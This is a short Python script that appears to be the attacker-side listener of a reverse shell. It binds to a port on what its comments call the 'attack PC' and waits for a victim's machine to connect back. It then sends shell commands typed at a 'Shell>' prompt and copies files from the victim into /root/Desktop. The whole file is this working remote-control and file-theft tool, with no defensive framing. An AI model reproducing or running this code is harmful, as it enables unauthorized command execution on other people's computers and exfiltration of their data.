import os
import socket

def transfer(conn, command):
    conn.send(command.encode())
    copy, path = command.split(" ") #copy command to transfer files <<<<<<
    f = open('/root/Desktop/'+path, 'wb') #running on LINUX <<<<<
    while True:
        bits = conn.recv(1024) #transfer 1KB of data
        if bits.endswith('DONE'.encode()): #finish 1KB of data
            f.write(bits[:-4]) #minus 4 bits (DONE)
            f.close()
            print ('[+] Transfer completed ')
            break
        if 'File not found'.encode() in bits:
            print ('[-] Unable to find out the file')
            break
        f.write(bits)
def connecting():
    s = socket.socket()
    s.bind(("192.168.x.x", 8080)) #bind TCP connection to attack PC <<<<
    s.listen(1)
    print('[+] Listening for income TCP connection on port 8080')
    conn, addr = s.accept()
    print('[+]We got a connection from', addr)

    while True:
        command = input("Shell> ") #loop shell
        if 'kill' in command: #kill shell connection
            conn.send('kill'.encode())
            break
        elif 'copy' in command:
            transfer(conn, command)
        else:
            conn.send(command.encode())
            print(conn.recv(1024).decode())
def main(): #connection
    connecting()
main()
